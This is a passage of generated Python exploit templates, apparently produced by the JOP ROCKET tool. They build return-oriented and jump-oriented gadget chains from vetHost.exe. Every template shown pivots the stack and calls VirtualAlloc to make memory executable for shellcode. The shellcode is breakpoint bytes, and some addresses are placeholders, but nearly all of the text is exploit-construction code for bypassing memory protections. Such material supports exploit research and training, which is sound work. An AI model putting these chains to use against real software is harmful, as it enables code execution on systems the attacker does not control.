		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x6c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes] 0x80
		# N----> STACK PIVOT TOTAL: 0x80 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ECX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes] 0x84
		# N----> STACK PIVOT TOTAL: 0x84 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ECX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes] 0x84
		# N----> STACK PIVOT TOTAL: 0x84 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x14
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013af, # (base + 0x13af), # pop ebx # add esp, 0x10 # jmp edx # vetHost.exe  [0x14 bytes]** 0x64
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0xa0
		# N----> STACK PIVOT TOTAL: 0xa0 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x11
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x22
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x33
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x44
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x55
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100255f, # (base + 0x255f), # add esp, 0x11 # jmp edi # vetHost.exe  [0x11 bytes]** 0x66
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0xa2
		# N----> STACK PIVOT TOTAL: 0xa2 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EDX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013b0, # (base + 0x13b0), # add esp, 0x10 # jmp edx # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110031b1, # (base + 0x31b1), # add esp, 0x3c # jmp esi # vetHost.exe  [0x3c bytes] 0xac
		# N----> STACK PIVOT TOTAL: 0xac bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
